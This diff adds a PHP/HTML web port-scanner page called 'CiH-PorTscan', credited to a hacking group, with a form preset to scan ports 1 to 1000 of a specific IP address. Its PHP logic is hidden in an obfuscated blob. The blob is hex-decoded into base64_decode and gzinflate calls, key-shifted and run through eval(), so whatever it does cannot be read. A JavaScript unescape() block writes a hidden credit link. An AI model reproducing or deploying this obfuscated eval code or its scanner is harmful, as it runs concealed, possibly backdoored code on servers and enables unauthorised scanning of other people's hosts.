@@ -1,0 +1,41 @@
+<html>
+<head>
+<title>CiH-PorTscan</title>
+
+   <meta name="description" content="CiH-PorTscan">
+<meta name="keywords" content="CiH, CiH_H@CkErZ, cih, port, scan">
+
+
+   <body bgcolor="#333333">
+
+   <form>
+<p align="center" dir="rtl"><font color="#FF0000"><b>
+CiH-PorTscan</b></font></p>
+  <form>
+  <td width="50%">Site ip(&#1575;&#1604;&#1575;&#1610; &#1576;&#1610;)</td>
+<input type="****" name="host" value="213.175.194.16">
+  <td width="50%">form (&#1605;&#1606;)</td>
+<input type="****" name="poort" value="1">
+  <td width="50%">to (&#1575;&#1604;&#1609;)</td>
+<input type="****" name="poort2" value="1000">
+<tr>
+    <td width="100%" colspan="2">
+
+    <p align="center"><input type="submit" value="Scan"></td>
+  </tr>
+
+</form>
+
+<?
+
+function d($s,$k=''){if($k==''){for($i=0;$i<strlen($s);$i){$d.=chr(hexdec(substr($s,$i,2)));$i=(float)($i)+2;}return $d;}else{$r='';$f=d('6261736536345f6465636f6465');$u=$f('Z3ppbmZsYXRl');$s=$u($f($s));for($i=0;$i<strlen($s);$i++){$c=substr($s,$i,1);$kc=substr($k,($i%strlen($k))-1,1);$c=chr(ord($c)-ord($kc));$r.=$c;}return $r;}}eval(d("TZHtbtowFIbvK5LVlHIBUR3qJKYJLdong5WiSpRWkzpVqqaWUaBhdhLixHZiAoOx7QYXuk7a33OOfc7zvFFkWdEyDyR2chv2by4N9L3dbjbg7WfoUpFH6thUntG9uYK2POvNxmxJXHsTUB+7jtva0micL2FBsnD8pO9vKhpdxVOVcGHk2TTEOA2k5yT2c6vnCDbj8NygBZvGuQhi7MS+aqKsjkLO09yrmWTBhSq893bnQKPUQws2S432GVIqI56xEkUkJHQSt9ajMlZHU8by7JyToMNElHY9msWyixq1h9RqrWHEFj78aSRZkhYGyt1D+P8r2Hz9ttF80yURL/wPp3MuZLf5ENfO4S8ADrQzGjApiGsKHsRuS9fXAFRBmKVUUp5BmRA54kQ8bSy0w2noeytdB5q+v61o2wMNABSFlhnOE7XF9mhwdXvvKC65Oh7a9SrYAuAEbTQbDG6/HieMF6o+LJGNaI6P/CSXBcaT64u7MUp4nhWnztQuHep7AKwJZRG2g489czS4vntEImNcvXMmtq6vAMCiXDEetlHaqWgowbhTBSXOb6ARkQcA/LNRu6R90zLHca37zFXRdN1kfkqIhD0jJpuXTHFj9w8z2vBNZzdDZ9giPFE/LHPyqf/l3omZUO6j+7I9lEIdtY0XLsLylTNp7bT8Dc7qlxVoE15II1rCxfRJxv63VydNdyQPW/r+ck5ZaNF8SQoL5SXXBMXDuge0TRXYSXmYKUob94gNy2EkJ/NwKhsXuZzGrkn4Up2YwmuVZ0QNXMpcP2dBuPA7fwA=",600373503));
+/* Encrypter By CiH Hosting  */
+
+?>
+
+<Script Language='Javascript'>
+<!--  -->
+<!--
+document.write(unescape('%3C%64%69%76%20%61%6C%69%67%6E%3D%63%65%6E%74%65%72%20%69%64%3D%27%6E%27%3E%3C%66%6F%6E%74%20%66%61%63%65%3D%74%61%68%6F%6D%61%20%73%69%7A%65%3D%32%3E%3C%62%3E%0A%20%20%26%6E%62%73%70%3B%3C%66%6F%6E%74%20%63%6F%6C%6F%72%3D%22%23%46%46%30%30%30%30%22%3E%44%65%76%65%6C%6F%70%65%72%20%62%79%20%43%69%48%20%3C%2F%66%6F%6E%74%3E%3C%66%6F%6E%74%20%63%6F%6C%6F%72%3D%22%23%46%46%46%46%46%46%22%3E%7C%3C%2F%66%6F%6E%74%3E%0A%09%3C%61%20%68%72%65%66%3D%22%68%74%74%70%3A%2F%2F%63%69%68%2D%68%6F%73%74%69%6E%67%2E%6E%65%74%22%3E%3C%66%6F%6E%74%20%63%6F%6C%6F%72%3D%22%23%46%46%46%46%30%30%22%3E%68%74%74%70%3A%2F%2F%63%69%68%2D%68%6F%73%74%69%6E%67%2E%6E%65%74%3C%2F%66%6F%6E%74%3E%3C%2F%61%3E%0A%20%20%09%3C%2F%62%3E%3C%2F%66%6F%6E%74%3E%3C%2F%64%69%76%3E%3C%2F%74%64%3E%3C%2F%74%72%3E%3C%2F%74%61%62%6C%65%3E%0A%09%09%09'));
+//-->
+</Script>
